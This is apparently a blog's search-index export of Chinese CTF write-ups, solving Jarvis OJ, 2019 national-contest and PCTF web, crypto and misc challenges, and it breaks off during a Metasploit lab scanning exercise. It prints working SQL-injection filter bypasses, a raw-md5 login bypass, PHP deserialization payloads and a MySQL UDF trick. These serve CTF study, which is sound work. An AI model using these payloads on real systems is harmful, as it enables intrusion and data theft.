<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[新学期新面貌]]></title>
    <url>%2F2019%2F09%2F11%2F%E6%96%B0%E5%AD%A6%E6%9C%9F%E6%96%B0%E9%9D%A2%E8%B2%8C%2F</url>
    <content type="text"><![CDATA[前言我还是太懒了，已经半年没更新博客，跟个废人一样。这个学期要振作起来！ 前天刚打完广东的强网杯，开始打时，醒来已经12多点，队友都差不多AK完了web,本菜鸡就只能玩了下MISC，然后就去摸鱼了，下面附上队友大腿的WP2019广东省强网杯writeup 另外：舍友安利了一个不错的CTF平台，趁这段时间课少，刷些基础题来提升一下，记录这段时间web狗的学习过程 PORT51题目入口：http://web.jarvisoj.com:32770/ 点击页面看到如下 Please use port 51 to visit this site. 以为用51端口访问，可是网页已经用了32770，改了之后访问不了的 12单纯的我以为这样:http://web.jarvisoj.com:51/ 后来才知道是本地51端口访问,使用curl命令 12curl --local-port 51 http://web.jarvisoj.com:32770/#PCTF&#123;X_F0rw4rd_F0R_is_not_s3cuRe&#125; LOCALHOST题目入口：http://web.jarvisoj.com:32774/1localhost access only!! X-Forwarded-For 127.0.0.1 PCTF{X_F0rw4rd_F0R_is_not_s3cuRe} Login题目入口：http://web.jarvisoj.com:32772/1需要密码才能获得flag哦。 进入看到一个提交密码的输入框 随便输入字符(包括非法字符)都只返回Wrong Password. 查看response发现 1hint:"select * from `admin` where password='".md5($pass,true)."'" 关键在于md5($pass,true) 1234567891011md5(string,raw)string 必需。规定要计算的字符串。 raw 可选。规定十六进制或二进制输出格式： • TRUE – 原始 16 字符二进制格式• FALSE – 默认。32 字符十六进制数如果md5计算后的值经过hex转成字符串后为 ”or’xxx’这样的字符串,则拼接后构成的语句为：select * from `admin` where password=”or’xxx’ 所以我们要找一个字符串使得md5()后再decode(‘hex’)得到有’ 下面提供两个payload1234567891011content: 129581926211651571912466741651878684928 hex: 06da5430449f8f6f23dfc1276f722738 raw: ?T0D??o#??’or’8.N=?content: ffifdyop hex: 276f722736c95d99e921722cf9ed621c raw: ‘or’6蒥欓!r,b 参考资料 最后密码输入ffifdyop PCTF{R4w_md5_is_d4ng3rous} 神盾局的秘密题目入口：http://web.jarvisoj.com:32768/1这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？ 刷新页面时F12在Network中看到showimg.php?img=c2hpZWxkLmpwZw== 123456789以下为后面所用到的信息&gt;&gt;&gt; 'c2hpZWxkLmpwZw=='.decode('base64')'shield.jpg'&gt;&gt;&gt; 'showimg.php'.encode('base64')'c2hvd2ltZy5waHA=\n'&gt;&gt;&gt; 'index.php'.encode('base64')'aW5kZXgucGhw\n'&gt;&gt;&gt; 'shield.php'.encode('base64')'c2hpZWxkLnBocA==\n' 读取showing.php内容:/showimg.php?img=c2hvd2ltZy5waHA= 123456789101112&lt;?php $f = $_GET['img']; if (!empty($f)) &#123; $f = base64_decode($f); if (stripos($f,'..')===FALSE &amp;&amp; stripos($f,'/')===FALSE &amp;&amp; stripos($f,'\\')===FALSE &amp;&amp; stripos($f,'pctf')===FALSE) &#123; readfile($f); &#125; else &#123; echo "File not found!"; &#125; &#125;?&gt; 没发现关于flag内容，读取index.php内容:/showimg.php?img=aW5kZXgucGhw 12345678&lt;!--?php require_once('shield.php'); $x = new Shield(); isset($_GET['class']) &amp;&amp; $g = $_GET['class']; if (!empty($g)) &#123; $x = unserialize($g); &#125; echo $x---&gt; index.php也没有出现与Flag相关的信息，但是index.php读取的class参数的值，并且没有对参数进行过滤 读取shield.php内容,/showimg.php?img=c2hpZWxkLnBocA== 12345678910111213141516&lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = '') &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;?&gt; 可以看到flag在pctf.php中,但做了过滤无法直接读取,考虑到index.php做了反序列化操作,并且在进行初始化的时候，将$filename赋值为pctf.php 123function __construct($filename = 'pctf.php') &#123; $this -&gt; file = $filename;&#125; 构造序列化 12345678910111213141516class Shield &#123; public $file; function __construct($filename = 'pctf.php') &#123; $this -&gt; file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;$x = new Shield();echo serialize($x);#O:6:"Shield":1:&#123;s:4:"file";s:8:"pctf.php";&#125; 最终payload 1234567http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:&#123;s:4:%22file%22;s:8:%22pctf.php%22;&#125;&lt;!--?php //Ture Flag : PCTF&#123;W3lcome_To_Shi3ld_secret_Ar3a&#125; //Fake flag: echo "FLAG: PCTF&#123;I_4m_not_fl4g&#125;"?--&gt; IN A MESS题目入口：http://web.jarvisoj.com:32780/ 连出题人自己都忘了flag放哪了，只记得好像很混乱的样子。 查源码发现index.phps 123456789101112131415161718192021222324252627&lt;?phperror_reporting(0);echo "&lt;!--index.phps--&gt;";if(!$_GET['id'])&#123; header('Location: index.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'Hahahahahaha'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="1112 is a nice lab!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("flag.txt");&#125;else&#123; print "work harder!harder!harder!";&#125;?&gt; 下面构造payload 123456id可以用弱类型来解决 id=0beregi函数可以用%00截断 b=%0011111难点在于a,可用php://input,然后post数据1112 is a nice lab!也可以data协议a=data:,1112 is a nice lab!#返回： Come ON!!! &#123;/^HT2mCpcvOLf&#125; 然而这并不像flag,而是路径，访问之自动跳到http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1 回显:hi666 更改id发现 1234id=2回显:SELECT * FROM content WHERE id=2id=1'or'1'='1 #回显:you bad boy/girl! 明显的sql注入了,而且过滤了很多关键字和空格，尝试用双写和/*1*/代替 12345678910111213141516id=-1/*1*/uniunionon/*1*/seselectlect/*1*/1#id=-1/*1*/uniunionon/*1*/seselectlect/*1*/1,2#id=-1/*1*/uniunionon/*1*/seselectlect/*1*/1,2,3#到这回显3，说明有3个字段查库:id=-1/*1*/uniunionon/*1*/seselectlect/*1*/1,2,database()#回显:test查表:id=-1/*1*/uniunionon/*1*/seselectlect/*1*/1,2,(seselectlect/*1*/group_concat(table_name)/*1*/frfromom/*1*/information_schema.tables/*1*/where/*1*/table_schema=database())%23回显:content查列:-1/*1*/uniunionon/*1*/seselectlect/*1*/1,2,(seselectlect/*1*/group_concat(column_name)/*1*/frfromom/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74)%23回显:id,context,title查内容:id=-1/*1*/uniunionon/*1*/seselectlect/*1*/1,2,(seselectlect/*1*/context/*1*/frfromom/*1*/content)%23回显:PCTF&#123;Fin4lly_U_got_i7_C0ngRatulation5&#125; RE? 咦，奇怪，说好的WEB题呢，怎么成逆向了？不过里面有个help_me函数挺有意思的哦 这道题完全复现别人的，挺有意思的，没有链接，只给了一个文件udf.so.02f8981200697e5eeb661e64797fc172 关于UDF的介绍 1234567UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。简单来说，udf是为了拓展功能而可以自行添加函数，不过添加的函数为恶意函数就能导致代码执行。OK，返回题目，题目给出的提示是“不过里面有个help_me函数挺有意思的哦”，那就是说这里需要创建自定义函数了。创建自定义函数的语法：create function 函数名 returns string soname ‘导出的DLL路径’； 在Ubuntu上下载文件 1wget https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172 拷贝至/usr/lib/mysql/plugin,然后启动mysql服务并登陆 12service mysql startmysql -u root -p 创建题目提示的自定义函数并访问 123456789101112131415161718192021222324252627mysql&gt; use mysql;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; create function help_me returns string soname 'udf.so.02f8981200697e5eeb661e64797fc172';ERROR 1125 (HY000): Function 'help_me' already existsmysql&gt; select help_me();+---------------------------------------------+| help_me() |+---------------------------------------------+| use getflag function to obtain your flag!! |+---------------------------------------------+1 row in set (0.00 sec)mysql&gt; create function getflag returns string soname 'udf.so.02f8981200697e5eeb661e64797fc172';Query OK, 0 rows affected (0.00 sec)mysql&gt; select getflag();+------------------------------------------+| getflag() |+------------------------------------------+| PCTF&#123;Interesting_U5er_d3fined_Function&#125; |+------------------------------------------+1 row in set (0.00 sec) end今天就写到这把，题目不难，很基础算开学初找下手感把。其实还是太累了不想做啊]]></content>
  </entry>
  <entry>
    <title><![CDATA[国赛2019初赛部分WP]]></title>
    <url>%2F2019%2F04%2F22%2F%E5%9B%BD%E8%B5%9B2019%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86WP%2F</url>
    <content type="text"><![CDATA[WebJustSoso ?file=php://filter/read=convert.base64-encode/resource=hint.php 1234567891011121314151617181920212223242526272829303132333435363738&lt;?php class Handle&#123; private $handle; public function __wakeup()&#123; foreach(get_object_vars($this) as $k =&gt; $v) &#123; $this-&gt;$k = null; &#125; echo "Waking up\n"; &#125; public function __construct($handle) &#123; $this-&gt;handle = $handle; &#125; public function __destruct()&#123; $this-&gt;handle-&gt;getFlag(); &#125;&#125;class Flag&#123; public $file; public $token; public $token_flag; function __construct($file)&#123; $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); &#125; public function getFlag()&#123; $this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag) &#123; if(isset($this-&gt;file))&#123; echo @highlight_file($this-&gt;file,true); &#125; &#125; &#125;&#125;?&gt;2+,ing ?file=php://filter/read=convert.base64-encode/resource=index.php 1234567891011121314151617181920212223242526272829&lt;html&gt;&lt;?phperror_reporting(0); $file = $_GET["file"]; $payload = $_GET["payload"];if(!isset($file))&#123; echo 'Missing parameter'.'&lt;br&gt;';&#125;if(preg_match("/flag/",$file))&#123; die('hack attacked!!!');&#125;@include($file);if(isset($payload))&#123; $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); foreach($query as $value)&#123; if (preg_match("/flag/",$value)) &#123; die('stop hacking!'); exit(); &#125; &#125; $payload = unserialize($payload);&#125;else&#123; echo "Missing parameters"; &#125; ?&gt;&lt;!--Please test index.php?file=xxx.php --&gt;&lt;!--Please get the source of hint.php--&gt;&lt;/html&gt;2+,ing payload这里执行了反序列操作，file变量填入hint.php将类文件导入进来，这里我们需要绕过parse_url，例如http://127.0.0.1///index.php 即可绕过从而执行payload 这里还有一个地方需要绕过： $this-&gt;token === $this-&gt;token_flag 这里使用指针将其指为一个地址即可 构造payload 1234567891011121314151617181920212223242526272829303132&lt;?phpclass Handle&#123; private $handle; public function __construct($handle) &#123; $this-&gt;handle = $handle; &#125; public function __destruct()&#123; $this-&gt;handle-&gt;getFlag(); &#125;&#125;class Flag&#123; public $file; function __construct($file)&#123; $this-&gt;file = $file; &#125; public function getFlag()&#123; if(isset($this-&gt;file))&#123; echo @highlight_file($this-&gt;file,true); &#125; &#125;&#125;$flag = new Flag('flag.php');$flag -&gt;token = &amp;$flag -&gt; token_flag;$exp = new Handle($flag);echo urlencode(serialize($exp)).PHP_EOL;//O%3A6%3A%22Handle%22%3A1%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22token_flag%22%3BN%3Bs%3A5%3A%22token%22%3BR%3A4%3B%7D%7D 还有一个地方需要绕过，绕过wakeup函数，实际上是1，我们将变量改为大于1即可绕过 Cryptopuzzlesquestion 01234a1:0xfa6a2:0xbeda3:0x9c7a4:0xa00 question 1 26364809 Part1 26366033 26366621 看到这三个数都是素数，猜想part1也可能是素数(并且相隔37)。google到如下的素数表12part1=26365399hex(26365399)=0x1924dd7 hex question 2 没什么好说的，极限和定积分在线求解12part2=(1+91+7+1)*77=7700hex(7700)=0x1e14 question 3 part3=0x48d0 question 4 part4=hex(336pi*120/pi=40320)=0x9d806 warmup 本题个是aes-ctr加密，但在同一次通信中其中的key和计数器不变,所以明文异或的密钥不会变. 所以需要在通信过程可以通过输入不同的填充获得密钥 AES_CTR 就是对明文分组做异或 输入：11111111111111111111111111111111111111111111111111111 (48+5 = 53个重复),得到密文分为6组分别为part1~part6 输入：11111 (5个重复),得到密文分为6组分别为No.1~No.3 代入即可求解1234567891011121314151617181920s1=["part1","part2","part3","part4","part5","part6"]s2=["NO.1","NO.2","NO.3"]ming="11111111111111111111111111111111111111111111111111111"minghex=ming.encode("hex")print minghexkey1=int(s1[0],16)^int(minghex,16)key2=int(s1[1],16)^int(minghex,16)key3=int(s1[2],16)^int(minghex,16)minghex0=int(s2[0],16)^key1minghex1=int(s2[1],16)^key2minghex2=int(s2[2],16)^key3print len(hex(key1))print len(hex(key2))print len(hex(key3))print hex(minghex0)print hex(minghex1)print hex(minghex2)print hex(minghex0)[2:-1].decode("hex")print hex(minghex1)[2:-1].decode("hex")print hex(minghex2)[2:-1].decode("hex") Asymmetric 没什么好讲的，就一RSA的基本解法12345678910111213import gmpy2N=754600786340927688096652328072061561501667781193760284816393637647032362908189628005150802929636396969230958922073774180726205402897453096041624408154494621307262657492560975357997726055874834308239749992507552325614973631556754707427580134609221878324704469965450463088892083264951442562525825243127575048386573246756312509362222667015490013299327398464802116909245529065994770788125182846841016932803939806558559335886481214931253578226314057242462834149031625361286317307273138514126289052003214703248070256059405676891634792175775697355408418965738663732479622148276007308404691800186837579126431484536836513358124181380166971922188839934522356902295160649189850427580493328509329115798694580347461641487270793993129066433242544366683131231903590153844590595882428219010673818765995719694470668924781499987923250883546686344997580959954960334567874040563037167422839228466141912000421309282727363913908613116739074234989825489075148091144771967111113068647060175231126374070143480727000247378471525286907200601035581143391602569836131345909055708005758380081303860198696570649330092070410465978479841469533490522594827330661914537170063053059393550673731195548189192109328158876774080143171304333338291909598353550442855717204721e=58134567416061346246424950552806959952164141873988197038339318172373514096258823300468791726051378264715940131129676561677588167620420173326653609778206847514019727947838555201787320799426605222230914672691109516799571428125187628867529996213312357571123877040878478311539048041218856094075106182505973331343540958942283689866478426396304208219428741602335233702611371265705949787097256178588070830596507292566654989658768800621743910199053418976671932555647943277486556407963532026611905155927444039372549162858720397597240249353233285982136361681173207583516599418613398071006829129512801831381836656333723750840780538831405624097443916290334296178873601780814920445215584052641885068719189673672829046322594471259980936592601952663772403134088200800288081609498310963150240614179242069838645027877593821748402909503021034768609296854733774416318828225610461884703369969948788082261611019699410587591866516317251057371710851269512597271573573054094547368524415495010346641070440768673619729280827372954003276250541274122907588219152496998450489865181536173702554116251973661212376735405818115479880334020160352217975358655472929210184877839964775337545502851880977049299029101466287659419446724781305689536816523774995178046989696610897508786776845460908137698543091418571263630383061605011820139755322231913029643701770497299157169690586232187419462594477116374977216427311975598620616618808494138669546120288334682865354702356192972496556372279363023366842805886601834278434406709218165445335977049796015123909789363819484954615665668979phi=165740755190793304655854506052794072378181046252118367693457385632818329041540419488625472007710062128632942664366383551452498541560538744582922713808611320176770401587674618121885719953831122487280978418110380597358747915420928053860076414097300832349400288770613227105348835005596365488460445438176193451867**4-165740755190793304655854506052794072378181046252118367693457385632818329041540419488625472007710062128632942664366383551452498541560538744582922713808611320176770401587674618121885719953831122487280978418110380597358747915420928053860076414097300832349400288770613227105348835005596365488460445438176193451867**3d=gmpy2.invert(e,phi)c=397664589731174185244807196969081295636743791347632992634877550171968202027583158122965358524605148382084087083055292775614950985582170471137600161892882032418551412966830769759927895880547815633951497722234770712306297076112879370771232002533504544337602525761984751743331880661186125346775270009628518533444304138475743540761869803954394981015216901027389649277312518044879870118578221153501921121767735420588646590238714924432821796920521634258142397614044689209502427096357648434975129259602082825127577076206003397304427079424477492861403400315663250325072548968845681025152851701569515687341859140204177488152275522562157702438579218042125793735027062228793066059121344460139665832155539640935735205492779952978907816559262061499244528361109871020021430760020031419798283808270133071565808900320433503202909269829912391264709602543303699123003147709062800113790217663557468058878220523200876377904766404202224175582491708673210826668402867922460431914279888880230599188839367957343839752438896262332473564984706656652754054197747324605372489970688044871961691577273950534597267097030840338786892644592482975063818909397183558108598420167691316258539257369739732052074157931998072754050437812781241004016365131849522113541913181print hex(pow(c,d,N))[2:].decode('hex') Miscsaleae 需要安装saleae logic工具然后导入文件 一上一下为0，同上为1,和异或的思想一样。 123456789101112131415161718192021222324252627282930313233343536373839404142011001100110110001100001 011001110111101100110001001100100011000000110111001100010011001100111001001101110010110100110001001110010110010000110001001011010011010000111000011001010011011000101101011000100110010100111000011000110010110100110111001110000011010001100010001110000011100101100001001110010011010101100101001100000011011101111101 二进制转字符即可 24C saleae logic导入文件 选择I2C协议导出12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849Time [s],Packet ID,Address,Data,Read/Write,ACK/NAK0.843872000000000,0,'160',' ',Write,ACK0.844038500000000,0,'160',f,Write,ACK0.844205000000000,0,'160',1,Write,ACK0.844371000000000,0,'160',6,Write,ACK0.844537500000000,0,'160',3,Write,ACK0.844704000000000,0,'160',b,Write,ACK0.844870500000000,0,'160',d,Write,ACK0.845036500000000,0,'160',f,Write,ACK0.845203000000000,0,'160',4,Write,ACK0.845369500000000,0,'160',e,Write,ACK0.845536000000000,0,'160',&#125;,Write,ACK0.845702500000000,0,'160','0',Write,ACK0.945962500000000,1,'160','0',Write,ACK0.946318000000000,2,'161',f,Read,ACK0.946481500000000,2,'161',l,Read,ACK0.946645000000000,2,'161',a,Read,ACK0.946808500000000,2,'161',g,Read,ACK0.946972000000000,2,'161',&#123;,Read,ACK0.947135500000000,2,'161',c,Read,ACK0.947299500000000,2,'161',4,Read,ACK0.947463000000000,2,'161',6,Read,ACK0.947626500000000,2,'161',d,Read,ACK0.947790000000000,2,'161',9,Read,ACK0.947953500000000,2,'161',e,Read,ACK0.948117500000000,2,'161',1,Read,ACK0.948281000000000,2,'161',0,Read,ACK0.948444500000000,2,'161',-,Read,ACK0.948608000000000,2,'161',e,Read,ACK0.948771500000000,2,'161',9,Read,ACK0.948935500000000,2,'161',b,Read,ACK0.949099000000000,2,'161',5,Read,ACK0.949262500000000,2,'161',-,Read,ACK0.949426000000000,2,'161',4,Read,ACK0.949589500000000,2,'161',d,Read,ACK0.949753000000000,2,'161',9,Read,ACK0.949917000000000,2,'161',0,Read,ACK0.950080500000000,2,'161',-,Read,ACK0.950244000000000,2,'161',a,Read,ACK0.950407500000000,2,'161',8,Read,ACK0.950571000000000,2,'161',8,Read,ACK0.950734500000000,2,'161',3,Read,ACK0.950898000000000,2,'161',-,Read,ACK0.951061500000000,2,'161',4,Read,ACK0.951225000000000,2,'161',1,Read,ACK0.951388500000000,2,'161',c,Read,NAK5.946647000000000,3,'160',\t,Write,ACK5.946813500000000,3,'160',a,Write,ACK5.946980000000000,3,'160',c,Write,ACK usbasp analyzer 选SPI 导出1234567891011121314151617181920212223242526272829303132333435363738394041424344Time [s],Packet ID,MOSI,MISO1.474939400000000,,f,'0'1.474945500000000,,l,'0'1.474951600000000,,a,'0'1.474957700000000,,g,'0'1.474963800000000,,&#123;,'0'1.474969900000000,,8,'0'1.474976000000000,,5,51.474982100000000,,b,'0'1.474988300000000,,0,'0'1.474994400000000,,8,'0'1.475000500000000,,4,'0'1.475006600000000,,c,'0'1.475012700000000,,6,61.475018800000000,,-,-1.475024900000000,,4,'0'1.475031100000000,,2,'0'1.475037200000000,,e,'0'1.475043300000000,,6,'0'1.475049400000000,,-,'0'1.475055500000000,,4,'0'1.475061600000000,,9,91.475067700000000,,5,'5'1.475073900000000,,c,'0'1.475080000000000,,-,'0'1.475086100000000,,8,'0'1.475092200000000,,7,'0'1.475098300000000,,b,'0'1.475104400000000,,4,01.475110500000000,,-,-1.475116600000000,,4,'4'1.475122800000000,,6,'0'1.475128900000000,,d,'0'1.475135000000000,,f,'0'1.475141100000000,,b,'0'1.475147200000000,,1,'0'1.475153300000000,,d,d1.475159400000000,,f,f1.475165500000000,,5,'1'1.475171700000000,,8,'0'1.475177800000000,,a,'0'1.475183900000000,,0,'0'1.475190000000000,,&#125;,'0'1.475196100000000,,'0','0']]></content>
  </entry>
  <entry>
    <title><![CDATA[PCTF2019-Writeup]]></title>
    <url>%2F2019%2F03%2F16%2FPCTF2019-Writeup%2F</url>
    <content type="text"><![CDATA[CryptographySpoiler Bran Stark, wants to convey an important information to the Sansa back at winterfell. He sends her a message. The message however, is encrypted though.Can you find out what Bran is trying to convey?? 题目给了一个key.pdf打开内容为 3a2c3a35152538272c2d213e332e3c25383030373a15 明明简单的一道题到头来做不出，后面发现脑洞还是不够强 winhex打开pdf看到文件尾后面有东西 提取出来刚好发现与米密文长度相同 6a6f6e736e6f776973647261676f6e62796269727468 xor一下123456a='3a2c3a35152538272c2d213e332e3c25383030373a15'b='6a6f6e736e6f776973647261676f6e62796269727468'flag=''for i in range(len(a)/2): flag+=chr(int(a[i*2:i*2+2],16)^int(b[i*2:i*2+2],16))print flag PCTF{JON_IS_TARGARYEN} The Order of the Phoenix1234567891011121314151617It's a new age Order of the Phoenix. The current members are:1.Harry2.Hermione3.Ron4.George5.Charlie6.Bill7.Ginny8.Fleur9.Luna10.NevilleEach of them has a secret QR code associated with him/her which is given to you. At the entrance of the Grimmauld place, is a system to scan their QR codes.Any 5 or more of them can enter at once, but not less than 5. This is in place to prevent any rash decisions made by very few people regarding the matters concerning the Order.However, now is an emergency time. Malfoy is causing trouble again, and Harry needs to enter Grimmauld Place for which he needs to know the secret associated with the entry system to let him in. Help him out. 题目给了10个人的二维码扫出来如下 12345678910Bill: a-424b493442128adbeef5ce33f18c6c5996cdd97e4922644a4479bb4e05f8846fCharlie: 8-1268bf4430c0b1a4c568a302da92421bc672aceb57fef3401f2434cfc3bf740bFleur: 9-b52781fd38b0185bd1a8a92a92dbf01c99eddbb50b86f65a882ad8a7fa313e9dGeorge: 6-7c61f3ee00ab759a6853f041e74ae2378144a96b662230888d6ba6412c646190Ginny: 7-d01f29e42de0ab1fb183a35d06a2ac6117acaad2b3017671846c7b380e83d6bbHarry: 1-d301da5536a5d8b8e2be50a7584127eb3704025f048cf72335f1b301b852b30aHermione: 2-e1af01e2f7887b63c068823cbcd812f91899678656456db71dfa9ab1fbb1bd26Luna: 4-510c9c8f6aaacebf16bb5fd9e2cd8c0845ec483bd49bf57fa4151e5b672c73b0Neville: 3-dc60d55a411ccfd4a44e6a9799774dd6207dffdfcab4b442075ead165fa7ecbRon: 5-bd4f58a846bb9e47a7402e22df13002aef3bf3048011674269eaff39154c62bf 然而不知道是干嘛的，完全没方向 看了hint Eleven scientists are working on a secret project…….? google一下不懂，但是github上找到方法传送门1234&gt;&gt;&gt; from secretsharing import PlaintextToHexSecretSharer&gt;&gt;&gt; flags=['1-d301da5536a5d8b8e2be50a7584127eb3704025f048cf72335f1b301b852b30a','2-e1af01e2f7887b63c068823cbcd812f91899678656456db71dfa9ab1fbb1bd26','3-dc60d55a411ccfd4a44e6a9799774dd6207dffdfcab4b442075ead165fa7ecb','4-510c9c8f6aaacebf16bb5fd9e2cd8c0845ec483bd49bf57fa4151e5b672c73b0','5-bd4f58a846bb9e47a7402e22df13002aef3bf3048011674269eaff39154c62bf','6-7c61f3ee00ab759a6853f041e74ae2378144a96b662230888d6ba6412c646190','7-d01f29e42de0ab1fb183a35d06a2ac6117acaad2b3017671846c7b380e83d6bb','8-1268bf4430c0b1a4c568a302da92421bc672aceb57fef3401f2434cfc3bf740b','9-b52781fd38b0185bd1a8a92a92dbf01c99eddbb50b86f65a882ad8a7fa313e9d','a-424b493442128adbeef5ce33f18c6c5996cdd97e4922644a4479bb4e05f8846f']&gt;&gt;&gt; PlaintextToHexSecretSharer.recover_secret(flags[0:10])'pctf&#123;sh4m1r3_w4s_4_gr34t_m4n&#125;\n' Help Rabin Rabin has received a text from someone special, but it’s all in ciphertext and he is unable to make head or tail of it. He requested her for a little hint, and she sent him the encryption algorithm. He’s still unable to decode the text. Not wanting to look dumb to her again, he needs your help in figuring out what she’s written for him. So help him out. ciphertext.txt4f741fe93dd7e383ff527caa9a2f27d27fd74b53b62123837b74a2b024d0fbbe052f3b330ce5208ba989fc68e2f5235ac4e9dd9e091e7cb80c02745d9b2aad10cab9431590ae63117ce539ebf747b4bc81f2a293aea52f0b1fee746158dc45d0c8d60769a8a8e671fb049b52669a010a1ca6f5de851d715bf1821d8771bbeb47 publickey.pem解析出来123key长度：1023模数：5BE098727AE610DE9C104819F3A1F7CC5B3144810B38D4F4D51BBE11D9CA20F287EED0236BCED1FE443A335A2F33C7A8AC68F09FC5F38BFE374A9207D3073D402C7A65A30B60F75B10E43A296730AA22D32527F7203EC9BECC6A7A0DD70A5CE3D1D5F2A8DB9868E8A4534EEF705F2C6A8326C88A536B827C88BC0005227AC9指数：1 (0x1) encrypt.py 1234567891011121314151617181920212223242526from Crypto.Util.number import *import randomdef nextPrime(prim): if isPrime(prim): return prim else: return nextPrime(prim+1)p = getPrime(512)q = nextPrime(p+1)while p%4 != 3 or q%4 !=3: p = getPrime(512) q = nextPrime(p+1)n = p*qm = open('secret.txt').read()m = bytes_to_long(m)m = m**ec = (m*m)%nc = long_to_bytes(c)c = c.encode('hex')cipherfile = open('ciphertext.txt','w')cipherfile.write(c) 题目得知用的是rabin算法,表面e=1,通过脚本可知实际是2 yafu分解模直接上脚本12345678910111213141516171819import libnumimport gmpy2# f = open('flag.enc','r')# c = f.read()# c = libnum.s2n(c)c = 55794223709813934192265135096073563545914401645083132264094031861211381439924290498765378643984142482022780941488967640941896234878298378029331869035026299883890239650523385184000895121634725249518610468891121286187697095281449541110528807147056849808508384046722319812216434329882704675650502328191347845959p = 8268478798627496550868057067863302848395658194493470189583465530982345058367642548587735876643165276333944105562045538477589025350029252013031979923054823q = 8268478798627496550868057067863302848395658194493470189583465530982345058367642548587735876643165276333944105562045538477589025350029252013031979923054799n = p*qr = pow(c,(p+1)/4,p)s = pow(c,(q+1)/4,q)a = gmpy2.invert(p,q)b = gmpy2.invert(q,p)x = (a*p*s+b*q*r)%ny = (a*p*s-b*q*r)%nprint libnum.n2s(x%n)print libnum.n2s((-x)%n)print libnum.n2s(y%n)print libnum.n2s((-y)%n) MISCEXORcism My friend Alex needs your help very fast. He has been possessed by a ghost and the only way to save him is if you tell the flag to the ghost. Hurry up, time is running out! 拿到文件encode.txt是一堆0和1，每行只有一个,去掉换行符后长度为10000,考虑是100*100,结果发现隐约是个二维码 然而直接扫不出来，把原始的1换作255 255 255，把0换作0 0 0写脚本1234567891011121314151617#-*- coding:utf-8 -*-from PIL import Imageimport rex = 100 #x坐标 通过对txt里的行数进行整数分解y = 100 #y坐标 x*y = 行数im = Image.new("RGB",(x,y))#创建图片file = open('encoded.txt') #打开rbg值文件#通过一个个rgb点生成图片for i in range(0,x): for j in range(0,y): line = file.readline()#获取一行 rgb = line.split(" ")#分离rgb im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))#rgb转化为像素im.save("255.png") 从二维码得到 160f15011d1b095339595138535f135613595e1a 与flag异或得到1234567a='160f15011d1b095339595138535f135613595e1a'b='flagflagflagflagflag'FLAG=''for i in range(len(a)/2): FLAG+=chr(int(a[i*2:i*2+2],16)^ord(b[i]))print FLAG#pctf&#123;wh4_50_53r1u5?&#125; Late PR 直接丢进winhex搜索pctf]]></content>
  </entry>
  <entry>
    <title><![CDATA[metasploit渗透流程练习]]></title>
    <url>%2F2019%2F01%2F25%2Fmetasploit%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E7%BB%83%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[metasploit学习主机发现 测试靶机主要为192.168.114.29,攻击机为192.168.114.176 db_nmap -v -n -sn 192.168.114.0/24 12345678910[*] Nmap: Starting Nmap 7.60 ( https://nmap.org ) at 2019-01-23 11:36 CST[*] Nmap: Initiating ARP Ping Scan at 11:36[*] Nmap: Scanning 255 hosts [1 port/host].........[*] Nmap: Host is up.[*] Nmap: Read data files from: /usr/bin/../share/nmap[*] Nmap: Nmap done: 256 IP addresses (63 hosts up) scanned in 7.80 seconds[*] Nmap: Raw packets sent: 493 (13.804KB) | Rcvd: 105 (2.940KB) 端口扫描 利用msf的db_namp端口扫描 db_nmap -sV -n -v –open -sS -p0-10000 192.168.114.29 发现开放端口(主要测试8585) 12345678910111213141516171819[*] Nmap: PORT STATE SERVICE VERSION[*] Nmap: 22/tcp open ssh OpenSSH 7.1 (protocol 2.0)[*] Nmap: 1617/tcp open rmiregistry Java RMI[*] Nmap: 3000/tcp open http WEBrick httpd 1.3.1 (Ruby 2.3.3 (2016-11-21))[*] Nmap: 4848/tcp open ssl/http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)[*] Nmap: 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)[*] Nmap: 8020/tcp open http Apache httpd[*] Nmap: 8027/tcp open unknown[*] Nmap: 8080/tcp open http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)[*] Nmap: 8282/tcp open http Apache Tomcat/Coyote JSP engine 1.1[*] Nmap: 8383/tcp open ssl/http Apache httpd[*] Nmap: 8585/tcp open http Apache httpd 2.2.21 ((Win64) 